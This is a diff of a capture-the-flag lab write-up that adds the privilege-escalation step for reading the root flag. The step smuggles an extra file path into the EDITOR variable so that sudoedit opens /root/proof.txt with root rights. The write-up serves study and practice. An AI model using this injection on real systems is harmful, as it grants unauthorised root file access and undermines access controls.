@@ -290,12 +290,26 @@ So to exploit this we have to specify the file we want to edit then run ```sudoe
 
 To get the root flag you can choose to either get a root shell or just read the root flag direcly
 
-I actually didn't get a root shell, which means I read the root flag directly
+I actually didn't get a root shell, which means I read the root flag directly since I already knew the root flag to be in ```/root/proof.txt```
 
 commands
 ```
-
+export EDITOR="nano -- /root/proof.txt"
+sudoedit /etc/hosts
 ```
+
+`16`
+`17`
+
+We got our root flag
+
+--------------------------------------
+
+# Green (Easy)
+<hr>
+
+
+
 
 
 
